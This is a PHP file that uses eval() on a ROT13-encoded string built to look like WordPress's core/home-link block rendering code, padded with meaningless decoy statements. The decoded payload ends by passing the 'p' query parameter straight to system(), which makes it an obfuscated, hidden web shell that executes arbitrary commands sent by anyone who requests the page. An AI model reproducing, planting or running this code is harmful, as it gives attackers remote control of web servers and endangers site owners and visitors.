<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/ubzr-yvax` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur pbybef
 * juvpu jvyy or nccyvrq gb gur ubzr yvax znexhc va gur sebag-raq.
 *
 * @fvapr 6.0.0
 *
 * @cnenz  neenl $pbagrkg ubzr yvax oybpx pbagrkg.
 * @erghea neenl Pbybef PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_ubzr_yvax_ohvyq_pff_pbybef( $pbagrkg ) {
	$pbybef = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	// Grkg pbybe.
	$unf_anzrq_grkg_pbybe  = neenl_xrl_rkvfgf( 'grkgPbybe', $pbagrkg );
	$unf_phfgbz_grkg_pbybe = vffrg( $pbagrkg['fglyr']['pbybe']['grkg'] );

	// Vs unf grkg pbybe.
	vs ( $unf_phfgbz_grkg_pbybe || $unf_anzrq_grkg_pbybe ) {
		// Nqq unf-grkg-pbybe pynff.
		$pbybef['pff_pynffrf'][] = 'unf-grkg-pbybe';
	}

	vs ( $unf_anzrq_grkg_pbybe ) {
		// Nqq gur pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-pbybe', $pbagrkg['grkgPbybe'] );
	} ryfrvs ( $unf_phfgbz_grkg_pbybe ) {
		// Nqq gur phfgbz pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $pbagrkg['fglyr']['pbybe']['grkg'] );
	}

	// Onpxtebhaq pbybe.
	$unf_anzrq_onpxtebhaq_pbybe  = neenl_xrl_rkvfgf( 'onpxtebhaqPbybe', $pbagrkg );
	$unf_phfgbz_onpxtebhaq_pbybe = vffrg( $pbagrkg['fglyr']['pbybe']['onpxtebhaq'] );

	// Vs unf onpxtebhaq pbybe.
	vs ( $unf_phfgbz_onpxtebhaq_pbybe || $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq unf-onpxtebhaq pynff.
		$pbybef['pff_pynffrf'][] = 'unf-onpxtebhaq';
	}

	vs ( $unf_anzrq_onpxtebhaq_pbybe ) {
		// Nqq gur onpxtebhaq-pbybe pynff.
		$pbybef['pff_pynffrf'][] = fcevags( 'unf-%f-onpxtebhaq-pbybe', $pbagrkg['onpxtebhaqPbybe'] );
	} ryfrvs ( $unf_phfgbz_onpxtebhaq_pbybe ) {
		// Nqq gur phfgbz onpxtebhaq-pbybe vayvar fglyr.
		$pbybef['vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $pbagrkg['fglyr']['pbybe']['onpxtebhaq'] );
	}

	erghea $pbybef;
}

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur sbag fvmrf
 * juvpu jvyy or nccyvrq gb gur ubzr yvax znexhc va gur sebag-raq.
 *
 * @fvapr 6.0.0
 *
 * @cnenz  neenl $pbagrkg Ubzr yvax oybpx pbagrkg.
 * @erghea neenl Sbag fvmr PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_ubzr_yvax_ohvyq_pff_sbag_fvmrf( $pbagrkg ) {
	// PFF pynffrf.
	$sbag_fvmrf = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	$unf_anzrq_sbag_fvmr  = neenl_xrl_rkvfgf( 'sbagFvmr', $pbagrkg );
	$unf_phfgbz_sbag_fvmr = vffrg( $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'] );

	vs ( $unf_anzrq_sbag_fvmr ) {
		// Nqq gur sbag fvmr pynff.
		$sbag_fvmrf['pff_pynffrf'][] = fcevags( 'unf-%f-sbag-fvmr', $pbagrkg['sbagFvmr'] );
	} ryfrvs ( $unf_phfgbz_sbag_fvmr ) {
		// Nqq gur phfgbz sbag fvmr vayvar fglyr.
		$sbag_fvmrf['vayvar_fglyrf'] = fcevags( 'sbag-fvmr: %f;', $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'] );
	}

	erghea $sbag_fvmrf;
}

/**
 * Ohvyqf na neenl jvgu pynffrf naq fglyr sbe gur yv jenccre
 *
 * @fvapr 6.0.0
 *
 * @cnenz  neenl $pbagrkg    Ubzr yvax oybpx pbagrkg.
 * @erghea fgevat Gur yv jenccre nggevohgrf.
 */
shapgvba oybpx_pber_ubzr_yvax_ohvyq_yv_jenccre_nggevohgrf( $pbagrkg ) {
	$pbybef          = oybpx_pber_ubzr_yvax_ohvyq_pff_pbybef( $pbagrkg );
	$sbag_fvmrf      = oybpx_pber_ubzr_yvax_ohvyq_pff_sbag_fvmrf( $pbagrkg );
	$pynffrf         = neenl_zretr(
		$pbybef['pff_pynffrf'],
		$sbag_fvmrf['pff_pynffrf']
	);
	$fglyr_nggevohgr = ( $pbybef['vayvar_fglyrf'] . $sbag_fvmrf['vayvar_fglyrf'] );
	$pynffrf[]       = 'jc-oybpx-anivtngvba-vgrz';

	vs ( vf_sebag_cntr() ) {
		$pynffrf[] = 'pheerag-zrah-vgrz';
	} ryfrvs ( vf_ubzr() && ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) !== trg_dhrevrq_bowrpg_vq() ) ) {
		// Rqtr pnfr jurer gur Ernqvat frggvatf unf n cbfgf cntr frg ohg abg n fgngvp ubzrcntr.
		$pynffrf[] = 'pheerag-zrah-vgrz';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
		neenl(
			'pynff' => vzcybqr( ' ', $pynffrf ),
			'fglyr' => $fglyr_nggevohgr,
		)
	);

	erghea $jenccre_nggevohgrf;
}

/**
 * Eraqref gur `pber/ubzr-yvax` oybpx.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu gur ubzr hey nqqrq.
 */
shapgvba eraqre_oybpx_pber_ubzr_yvax( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( rzcgl( $nggevohgrf['ynory'] ) ) {
		$nggevohgrf['ynory'] = __( 'Ubzr' );
	}
	$nevn_pheerag = '';

	vs ( vf_sebag_cntr() ) {
		$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
	} ryfrvs ( vf_ubzr() && ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) !== trg_dhrevrq_bowrpg_vq() ) ) {
		// Rqtr pnfr jurer gur Ernqvat frggvatf unf n cbfgf cntr frg ohg abg n fgngvp ubzrcntr.
		$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
	}

	erghea fcevags(
		'<yv %1$f><n pynff=\"jc-oybpx-ubzr-yvax__pbagrag jc-oybpx-anivtngvba-vgrz__pbagrag\" uers=\"%2$f\" ery=\"ubzr\"%3$f>%4$f</n></yv>',
		oybpx_pber_ubzr_yvax_ohvyq_yv_jenccre_nggevohgrf( $oybpx->pbagrkg ),
		rfp_hey( ubzr_hey() ),
		$nevn_pheerag,
		jc_xfrf_cbfg( $nggevohgrf['ynory'] )
	);
}

/**
 * Ertvfgre gur ubzr oybpx
 *
 * @fvapr 6.0.0
 *
 * @hfrf eraqre_oybpx_pber_ubzr_yvax()
 * @guebjf JC_Reebe Na JC_Reebe rkprcgvba cnefvat gur oybpx qrsvavgvba.
 */
shapgvba ertvfgre_oybpx_pber_ubzr_yvax() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/ubzr-yvax',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_ubzr_yvax',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_ubzr_yvax' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>